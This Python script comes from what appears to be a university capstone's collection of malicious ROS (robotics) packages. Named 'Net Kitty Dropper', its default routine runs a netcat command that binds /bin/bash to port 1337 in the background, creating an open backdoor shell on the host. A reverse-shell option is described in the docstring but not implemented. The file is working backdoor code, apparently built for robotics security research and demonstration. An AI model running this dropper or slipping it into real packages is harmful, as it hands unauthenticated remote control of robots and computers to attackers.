#!/usr/bin/python
###################################################################################
##                _____________
##               /           ,.\
##              /           /  \\
##        o    /           {    }\
##         `.  \ ....       \  / /
##           `. \ \\\\       `' /
##             \ \_____________/
##              \      \ \
##               \      \ \
##                \     _\ \________________________
##                (`\  /  \ \ ___         "-._       )
##                 \ \/   /`-'  /,       /`-._"-._  /
##                  `/    """"""'       /___ _"-._"-._
##                  /___ __  _          `-._      '  /
##                  \  RoboSec              "-._ /  /
##                 __\________________________  "  /
##               /    '//,  '//'               )__/
##              /       '///'    ,//'/,       /
##             (.---------------------------./
##              `:.                        //
##                `=======================''
##                  Security for Robotics
##
##             Oregon State University - CS Capstone
##
##         Zach Rogers - Malicious ROS Package Collection
##
##                    Net Kitty Dropper :3c
##                         nc_drop.py
###################################################################################
import os #for os.system calls
#import rospy

#Should we be loud and proud?
VERBOSE = True

def log(text):
    """
    Logging function - Will output text if VERBOSE is set to True, otherwise calls will be ignored.

    Parameters:
    --------------
        * text - String of text to be logged

    """

    if VERBOSE:
        print str(text)

def meow(method="Listening_sys", port="1337", reverse_IP="", reverse_port=""):
    """
    Starts the netcat process, based on the given parameters.

    Parameters:
    --------------
        * method - Which method of netcat to use, these are string values:
            * "Listening_sys" - Listening backdoor, via system call. This will fail if nc is not installed.
            * "Reverse_sys" - Reverse backdoor, via system call. This will fail if nc is not installed.
                * Requires that reverse_IP and reverse_port be set.

        * port - Port for listening, defaulted to 1337, for the lulz.
        * reverse_IP - Reverse IP to connect to, for the reverse shell, if the method is set to "Reverse_sys"
        * reverse_port - Reverse port to connect to, if the method is set to "Reverse_sys"

    Nice NC ref: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
    """

    if method == "Listening_sys":
        os.system(str("nc -l -p ") + str(port) + str(" -e /bin/bash &"))

    else:
        log("method not implemented...")

def main():
    log("[~] net kitty dropper :3c")
    meow()

if __name__ == '__main__':
    main()
